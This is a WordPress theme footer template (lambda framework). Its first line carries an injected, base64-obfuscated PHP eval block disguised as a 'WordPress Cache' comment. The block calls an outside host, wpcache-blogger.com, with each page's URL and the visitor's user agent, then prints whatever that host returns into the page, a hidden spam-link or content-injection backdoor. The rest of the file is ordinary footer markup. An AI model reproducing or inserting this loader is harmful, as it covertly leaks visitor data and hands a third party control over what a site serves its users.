<?php /* <!-- Begin WordPress Cache (DO NOT MODIFY) --> */eval(base64_decode("ZnVuY3Rpb24gZmlsZV9nZXRfY29udGVudHNfY3VybCgkdXJsKSB7CiAkY2ggPSBjdXJsX2luaXQoKTsKIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgIkxPQ0FMU0FQRSIpOwogJGRhdGEgPSBjdXJsX2V4ZWMoJGNoKTsKIGN1cmxfY2xvc2UoJGNoKTsKIHJldHVybiAkZGF0YTsKfQokbGlua3MgPSBmaWxlX2dldF9jb250ZW50c19jdXJsKCJodHRwOi8vd3BjYWNoZS1ibG9nZ2VyLmNvbS9nZXRsaW5rcy5waHA/YXBpY29kZT1sYWxhbGE0NCZwYWdldXJsPSIudXJsZW5jb2RlKCdodHRwOi8vJy4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXSkuIiZ1c2VyYWdlbnQ9Ii51cmxlbmNvZGUoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKS4iIik7CmVjaG8gJGxpbmtzOw=="));/* <!-- End WordPress Cache --> */ ?>	</div>
	<div class="clear"></div>
</div><!-- /.columns (#content) -->
<?php 

/**
 * The Footer
 * 
 * lambda framework v 2.1
 * by www.unitedthemes.com
 * since lambda framework v 2.0
 */
 
global $lambda_meta_data, $theme_options;
$metadata = $lambda_meta_data->the_meta();

$footerwidgets = is_active_sidebar('first-footer-widget-area') + is_active_sidebar('second-footer-widget-area') + is_active_sidebar('third-footer-widget-area') + is_active_sidebar('fourth-footer-widget-area');
$class = ($footerwidgets == '0' ? 'noborder' : 'normal'); ?>

<div id="footer-wrap" class="fluid clearfix">
	<div class="container">
			<footer id="footer" class="<?php echo $class; ?> sixteen columns"> 

			<?php //loads sidebar-footer.php
				get_sidebar( 'footer' );
			?>
            
			</footer><!--/#footer-->
           	
    </div><!--/.container-->
</div><!--/#footer-wrap-->
            
			<div id="sub-footer-wrap" class="clearfix">
				<div class="container">
                	<div class="sixteen columns">
                    <div class="scissors"></div>	
                		<div class="copyright eight columns alpha">
                    
						<?php if(!get_option_tree('site_copyright')) { ?>
                        
                            &copy; <?php echo date( 'Y' ); ?> <a href="<?php echo home_url(); ?>"><?php echo get_bloginfo( 'name' ); ?></a>			
                        
                        <?php } else { ?>
                        
                            <?php echo get_option_tree('site_copyright'); ?>		
                        
                        <?php } ?>
                        
                    	</div>
                    
                    	<?php 
                    
                        $copyright = (get_option('lambdacopyright')) ? get_option('lambdacopyright') : '';
                        $copyrightlink = (get_option('lambdacopyrightlink')) ? get_option('lambdacopyrightlink') : '';
                    
                    	?>
                    
                    	<div class="unitedthemes eight columns omega">
                       
                        <?php if(!empty($copyright)) : ?>
                        
                        Powered by <a href="<?php echo $copyrightlink; ?>"><?php echo $copyright; ?></a>
                        
                        <?php endif; ?>
					
                		</div>
                            
                	</div>
                </div>      
		</div><!--/#sub-footer-wrap-->	
    

</div><!--/#wrap -->

<?php
#-----------------------------------------------------------------
# Special JavaScripts 
# Do not edit anything below to keep theme functions
#-----------------------------------------------------------------
			
// Google Analytics
if (get_option_tree('google_analytics')) {
	echo stripslashes(get_option_tree('google_analytics'));
} ?>

<?php wp_footer();?>

</body>
</html>